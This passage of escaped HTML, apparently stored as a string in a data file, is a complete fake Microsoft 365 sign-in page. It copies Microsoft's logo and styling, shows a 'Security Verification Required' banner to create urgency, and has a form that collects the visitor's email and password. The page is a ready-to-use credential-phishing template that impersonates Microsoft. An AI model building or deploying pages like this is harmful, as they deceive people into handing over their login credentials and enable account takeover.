      border-color: #0078d4;\n        }\n        .signin-btn {\n            background-color: #0078d4;\n            color: white;\n            border: none;\n            padding: 13px;\n            width: 100%;\n            border-radius: 2px;\n            font-size: 15px;\n            cursor: pointer;\n            margin-top: 24px;\n        }\n        .signin-btn:hover {\n            background-color: #106ebe;\n        }\n        .remember-me {\n            display: flex;\n            align-items: center;\n            margin-top: 16px;\n        }\n        .remember-me input {\n            margin-right: 8px;\n        }\n        .links {\n            margin-top: 24px;\n            text-align: center;\n        }\n        .links a {\n            color: #0078d4;\n            text-decoration: none;\n            font-size: 13px;\n        }\n        .security-notice {\n            background-color: #fff4ce;\n            border-left: 4px solid #ffb900;\n            padding: 12px;\n            margin-bottom: 20px;\n            font-size: 13px;\n        }\n        .footer {\n            margin-top: 40px;\n            text-align: center;\n            font-size: 11px;\n            color: #666;\n        }\n    </style>\n</head>\n<body>\n    <div class=\"login-container\">\n        <div class=\"logo\">\n            <svg width=\"108\" height=\"24\" viewBox=\"0 0 108 24\" fill=\"none\">\n                <rect x=\"0\" y=\"0\" width=\"10\" height=\"10\" fill=\"#f25022\"/>\n                <rect x=\"12\" y=\"0\" width=\"10\" height=\"10\" fill=\"#7fba00\"/>\n                <rect x=\"0\" y=\"12\" width=\"10\" height=\"10\" fill=\"#00a4ef\"/>\n                <rect x=\"12\" y=\"12\" width=\"10\" height=\"10\" fill=\"#ffb900\"/>\n                <text x=\"28\" y=\"16\" font-family=\"Segoe UI\" font-size=\"16\" fill=\"#5e5e5e\">Microsoft</text>\n            </svg>\n        </div>\n        \n        <div class=\"security-notice\">\n            <strong>⚠️ Security Verification Required</strong><br>\n            Please verify your identity to continue accessing your account.\n        </div>\n        \n        <h1>Sign in</h1>\n        <div class=\"subtitle\">to continue to Microsoft 365</div>\n        \n        <form method=\"POST\" action=\"\">\n            <div class=\"form-group\">\n                <label for=\"email\">Email, phone, or Skype</label>\n                <input type=\"email\" id=\"email\" name=\"email\" required>\n            </div>\n            \n            <div class=\"form-group\">\n                <label for=\"password\">Password</label>\n                <input type=\"password\" id=\"password\" name=\"password\" required>\n            </div>\n            \n            <div class=\"remember-me\">\n                <input type=\"checkbox\" id=\"remember\" name=\"remember\">\n                <label for=\"remember\">Keep me signed in</label>\n            </div>\n            \n            <button type=\"submit\" class=\"signin-btn\">Sign in</button>\n        </form>\n        \n        <div class=\"links\">\n            <a href=\"#\">Can't access your account?</a>\n        </div>\n        \n        <div class=\"footer\">\n            <a href=\"#\">Terms of use</a> | <a href=\"#\">Privacy & cookies</a>\n        </div>\n    </div>\n</body>\n</html>",
